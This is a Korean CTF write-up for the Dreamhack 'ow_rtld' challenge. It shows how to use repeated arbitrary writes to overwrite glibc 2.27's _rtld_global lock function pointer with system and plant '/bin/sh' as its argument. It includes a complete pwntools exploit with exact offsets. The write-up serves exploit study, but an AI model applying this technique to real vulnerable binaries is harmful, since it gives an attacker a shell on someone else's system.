# overwrite_rtld_global (glibc 2.27)

Dreamhack `ow_rtld` — **임의 주소 쓰기(AAW)를 반복**할 수 있을 때의 `_rtld_global` overwrite.
쓰기가 여러 번이라 one_gadget 없이 **`system("/bin/sh")`** 를 직접 구성하는 더 깔끔한 변형.

바이너리: x86-64. libc **2.27**, ld **2.27** 동봉. (`../rtld`는 쓰기 1발+one_gadget 버전, 개념은 `../note.md`)

---

## 0. 한눈에

| 항목 | 값 |
|---|---|
| 능력 | `*(long long*)addr = data` 를 **루프로 여러 번** (case 1 반복) |
| 릭 | `printf("stdout: %p")` → libc/ld base |
| 핵심 | `_dl_fini` 가 `GL(dl_rtld_lock_recursive)(&GL(dl_load_lock).mutex)` 호출하는 점 이용 |
| 트릭 | **인자 자리(`dl_load_lock`)에 `"/bin/sh"` 를 심고**, 함수포인터를 `system` 으로 덮음 |
| 트리거 | `case 2`(=default) 선택 → `return` → 로더가 호출 |

```c
int main() {
  printf("stdout: %p\n", stdout);     // ★ libc 릭
  while (1) {
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        scanf("%ld", &addr); scanf("%ld", &data);
        *(long long *)addr = data;    // ★ AAW, 몇 번이든 반복 가능
        break;
      default:
        return 0;                     // ★ 종료 트리거
    }
  }
}
```

---

## 1. `../rtld`와 뭐가 다른가 — 쓰기가 "반복"이다

`_dl_fini` 안의 호출을 다시 보면:

```c
#define __rtld_lock_lock_recursive(NAME) \
    GL(dl_rtld_lock_recursive) (&(NAME).mutex)
// 실제:  GL(dl_rtld_lock_recursive) ( &GL(dl_load_lock).mutex )
```

즉 호출되는 함수 = `_dl_rtld_lock_recursive`, **첫 번째 인자(rdi) = `&dl_load_lock`**.

쓰기가 1발이면 인자를 못 만들어서 one_gadget을 썼지만(`../rtld`), **여기선 쓰기가 반복**되니:

1. **인자 자리**인 `dl_load_lock` 에 문자열 **`"/bin/sh"`** 를 써 넣고
2. **함수 포인터** `_dl_rtld_lock_recursive` 를 **`system`** 으로 덮는다

→ 종료 시 `_dl_fini`가 `system(&dl_load_lock)` = **`system("/bin/sh")`** 를 호출. one_gadget 제약 없이 확실.

---

## 2. 릭 → base, 그리고 두 타겟 오프셋

```
libc_base = stdout - libc.sym['_IO_2_1_stdout_']
ld_base   = libc_base + 0x3f1000               # 2.27 기준 libc↔ld 고정 오프셋

rtld_global            = ld_base + ld.sym['_rtld_global']
dl_load_lock           = rtld_global + 2312    # 인자가 될 mutex(=&dl_load_lock)
dl_rtld_lock_recursive = rtld_global + 3840    # 호출될 함수 포인터
system                 = libc_base + libc.sym['system']
```

`+2312`(인자 위치)와 `+3840`(함수 포인터)은 2.27 구조체 오프셋. `/bin/sh`는 8바이트에 딱 맞으니 포인터 대신 **문자열 자체**를 그 자리에 박는다(`system`은 rdi를 "명령 문자열의 주소"로 받으므로 `&dl_load_lock`가 곧 `"/bin/sh"`가 됨).

---

## 3. Exploit (`poc.py`)

```python
from pwn import *
p = remote('host3.dreamhack.games', 24116)
libc = ELF('./libc-2.27.so'); ld = ELF('./ld-2.27.so')

p.recvuntil(b': ')
stdout    = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base   = libc_base + 0x3f1000

rtld_global            = ld_base + ld.symbols['_rtld_global']
dl_load_lock           = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840
system                 = libc_base + libc.symbols['system']

# ① 인자 자리에 "/bin/sh" 심기  (rdi = &dl_load_lock)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
p.sendlineafter(b'data: ', str(u64(b'/bin/sh\x00')).encode())

# ② 함수 포인터를 system 으로 덮기
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'data: ', str(system).encode())

# ③ default(return) → _dl_fini → system("/bin/sh")
p.sendlineafter(b'> ', b'2')
p.interactive()
```

---

## 4. 배울 점

- **AAW가 반복 가능하면 one_gadget 쓸 이유가 없다.** 호출될 함수 포인터 + 그 함수의 인자 자리를 둘 다 세팅 → `system("/bin/sh")`를 그대로 구성이 정석이고 제일 안정적.
- 핵심은 **"호출 규약까지 읽는 것"**: `_dl_fini`가 넘기는 rdi가 `&dl_load_lock`라는 걸 알아야, 그 자리에 `"/bin/sh"`를 심는 발상이 나온다.
- `"/bin/sh"`는 정확히 8바이트(+널) → 포인터 테이블을 거칠 필요 없이 **구조체 멤버 안에 문자열을 직접** 넣는다.
- 오프셋(`+2312`, `+3840`, `0x3f1000`)은 전부 **glibc 2.27 전용**. 버전 바뀌면 gdb로 재확인.
- 유효 범위: `_rtld_global` 함수 포인터 기법은 **glibc 2.34 이전**.
